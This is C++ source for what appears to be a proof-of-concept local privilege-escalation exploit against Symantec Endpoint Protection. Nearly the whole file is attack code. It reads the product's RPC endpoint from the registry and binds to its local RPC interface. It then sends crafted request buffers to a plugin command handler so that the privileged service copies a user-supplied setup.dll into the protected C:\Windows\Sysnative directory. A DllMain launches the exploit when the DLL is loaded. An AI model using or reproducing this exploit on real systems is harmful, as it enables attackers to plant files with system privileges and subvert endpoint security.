#include "stdafx.h"
#include "1031_0100_rpc_h.h"
#include <comdef.h>

#pragma comment(lib, "rpcrt4.lib")

#define SOURCE_FILE "C:\\Users\\user\\setup.dll"
#define DESTINATION_FILE "C:\\Windows\\Sysnative\\setup.dll"

extern "C" void __RPC_FAR * __RPC_USER midl_user_allocate(size_t len)
{
	return(malloc(len));
}

extern "C" void __RPC_USER midl_user_free(void __RPC_FAR * ptr)
{
	free(ptr);
}

void GetEndpoint(wchar_t **wEndpoint)
{
	DWORD dwBufSize = 0;
	long lStatus = 0;
	HKEY hKey;

	lStatus = RegGetValue(HKEY_LOCAL_MACHINE, L"SOFTWARE\\WOW6432Node\\Symantec\\Symantec Endpoint Protection\\{C54D76E6-7423-47FD-84BA-DA73F3C0958F}\\Common Client\\ccIPC\\Channels",
		L"{BFADC982-75E5-497A-A114-95856CCE9A33}",
		RRF_RT_REG_SZ, NULL, &wEndpoint, &dwBufSize);
	if (lStatus != ERROR_MORE_DATA)
		return;

	*wEndpoint = (wchar_t*)malloc(dwBufSize);
	ZeroMemory(*wEndpoint, dwBufSize);

	lStatus = RegGetValue(HKEY_LOCAL_MACHINE, L"SOFTWARE\\WOW6432Node\\Symantec\\Symantec Endpoint Protection\\{C54D76E6-7423-47FD-84BA-DA73F3C0958F}\\Common Client\\ccIPC\\Channels",
		L"{BFADC982-75E5-497A-A114-95856CCE9A33}",
		RRF_RT_REG_SZ, NULL, *wEndpoint, &dwBufSize);
	if (lStatus != ERROR_SUCCESS) {
		free(*wEndpoint);
		printf("Err: %d\n", lStatus);
		return;
	}
}

RPC_STATUS CreateBindingHandle(RPC_BINDING_HANDLE *binding_handle)
{
	RPC_STATUS status;
	RPC_BINDING_HANDLE v5;
	RPC_SECURITY_QOS SecurityQOS = {};
	RPC_WSTR StringBinding = nullptr;
	RPC_BINDING_HANDLE Binding;

	wchar_t *wEndpoint;
	GetEndpoint(&wEndpoint);
	RPC_WSTR Endpoint = (RPC_WSTR)wEndpoint;
	
	StringBinding = 0;
	Binding = 0;
	status = RpcStringBindingComposeW((RPC_WSTR)L"5ca4f88d-67b7-46ce-9653-5a17519f66f0", (RPC_WSTR)L"ncalrpc",
		nullptr, Endpoint, nullptr, &StringBinding);
	if (status == RPC_S_OK)
	{
		status = RpcBindingFromStringBindingW(StringBinding, &Binding);
		RpcStringFreeW(&StringBinding);
		if (!status)
		{
			SecurityQOS.Version = 1;
			SecurityQOS.ImpersonationType = RPC_C_IMP_LEVEL_IMPERSONATE;
			SecurityQOS.Capabilities = RPC_C_QOS_CAPABILITIES_DEFAULT;
			SecurityQOS.IdentityTracking = RPC_C_QOS_IDENTITY_STATIC;

			status = RpcBindingSetAuthInfoExW(Binding, 0, 6u, 0xAu, 0, 0, (RPC_SECURITY_QOS*)&SecurityQOS);
			if (!status)
			{
				v5 = Binding;
				Binding = 0;
				*binding_handle = v5;
			}
			else
				printf("[0] Failed to call RpcBindingSetAuthinfoExW\n");
		}
		else
			printf("[0] Failed to call RpcBindingFromStringBinding\n");
	}

	if (Binding)
		RpcBindingFree(&Binding);
	return status;
}

int main(void)
{
	RPC_BINDING_HANDLE handle = NULL;
	RPC_STATUS status = CreateBindingHandle(&handle);
	if (status != RPC_S_OK) {
		return 1;
	}

	RpcTryExcept
	{
		long lOut = NULL, lOut2 = NULL;
		byte *bOut2 = 0;
		LPVOID lpHandle = NULL, lpInBuf = NULL;

		UUID myUuid;
		UuidCreate(&myUuid);

		lpInBuf = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x20);
		lpHandle = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x10);

		*(DWORD*)lpInBuf = 0x1;
		*((DWORD*)lpInBuf + 1) = (byte)0xf;
		memcpy((LPVOID)((byte*)lpInBuf + 1 + sizeof(DWORD)), &myUuid, sizeof(UUID));

		status = Proc0(handle, 0x15, (byte*)lpInBuf, &lOut2, &bOut2, &lpHandle);
		if (status != RPC_S_OK || lpHandle == NULL)
		{
			HeapFree(GetProcessHeap(), 0, lpInBuf);
			HeapFree(GetProcessHeap(), 0, lpHandle);
			return 1;
		}

		LPVOID lpRequestBuf = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 256);
		LPCWSTR wPluginGuid = L"{BFADC982-75E5-497A-A114-95856CCE9A33}"; // channel string
		DWORD dwHandlerGuid[4] = { 0x96b8b459, 0x4c7a2d37, 0x297e96a0, 0xabfdd607 }; // command handler GUID; AVHostPlugin
		LPCWSTR wCommandGuid = L"{FFA13357-6B90-4E53-A9A7-F530045B44E1}";
		DWORD GuidLen = (wcslen(wPluginGuid) * 2) + 2;

		*(DWORD*)lpRequestBuf = 0x1; // version
		*((DWORD*)lpRequestBuf + 1) = GuidLen; // GUID length
		memcpy((LPVOID)((DWORD*)lpRequestBuf + 2), wPluginGuid, GuidLen);
		memcpy((LPVOID)((byte*)lpRequestBuf + GuidLen + (sizeof(DWORD) * 2)), &dwHandlerGuid[0], sizeof(DWORD));
		memcpy((LPVOID)((byte*)lpRequestBuf + GuidLen + (sizeof(DWORD) * 3)), &dwHandlerGuid[1], sizeof(DWORD));
		memcpy((LPVOID)((byte*)lpRequestBuf + GuidLen + (sizeof(DWORD) * 4)), &dwHandlerGuid[2], sizeof(DWORD));
		memcpy((LPVOID)((byte*)lpRequestBuf + GuidLen + (sizeof(DWORD) * 5)), &dwHandlerGuid[3], sizeof(DWORD));

		memcpy((LPVOID)((byte*)lpRequestBuf + GuidLen + (sizeof(DWORD) * 6)), &GuidLen, sizeof(DWORD));
		memcpy((LPVOID)((byte*)lpRequestBuf + GuidLen + (sizeof(DWORD) * 7)), wCommandGuid, GuidLen);

		// build meta buffer
		LPVOID lpCommandBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 64);
		*(DWORD*)lpCommandBuffer = 0x1; // version
		*((WORD*)lpCommandBuffer + 2) = 0x2; // argument type

		DWORD dwBufLen = 112;
		memcpy((LPVOID)((byte*)lpCommandBuffer + sizeof(DWORD) + sizeof(WORD)), &dwBufLen, sizeof(DWORD)); // buf len
		LPVOID lpHdPtr = (byte*)lpCommandBuffer + 18;
		*((byte*)lpHdPtr + 1) = 17;
		*((byte*)lpHdPtr + 5) = 64;
		*((byte*)lpHdPtr + 6) = 1;
		*((byte*)lpHdPtr + 7) = 3;
		*((DWORD*)lpHdPtr + 16 / 4) = GetCurrentProcessId(); // PID

		short dwExistingLength = strlen(SOURCE_FILE) + 1, dwNewLength = strlen(DESTINATION_FILE) + 1;
		memcpy((LPVOID)((byte*)lpHdPtr + 20), &dwExistingLength, sizeof(WORD));
		memcpy((LPVOID)((byte*)lpHdPtr + 20 + sizeof(WORD)), SOURCE_FILE, dwExistingLength);

		memcpy((LPVOID)((byte*)lpHdPtr + 20 + sizeof(WORD) + dwExistingLength), &dwNewLength, sizeof(WORD));
		memcpy((LPVOID)((byte*)lpHdPtr + 20 + sizeof(WORD) + dwExistingLength + sizeof(WORD)), DESTINATION_FILE, dwNewLength);

		Proc6(handle, lpHandle, 0xb8, (byte*)lpRequestBuf, 0x100, (byte*)lpCommandBuffer, &lOut, &bOut2);

		HeapFree(GetProcessHeap(), 0, lpRequestBuf);
		HeapFree(GetProcessHeap(), 0, lpInBuf);
		HeapFree(GetProcessHeap(), 0, lpHandle);
		HeapFree(GetProcessHeap(), 0, lpCommandBuffer);
	}
	RpcExcept(1)
	{
		ULONG ulCode = RpcExceptionCode();
		wchar_t code[256];
		wsprintf(code, L"RPC error:: 0x%lx = %ld\n", ulCode, ulCode);
	}
	RpcEndExcept

	ExitProcess(0);
	return 0;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, 0, 0, NULL);
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

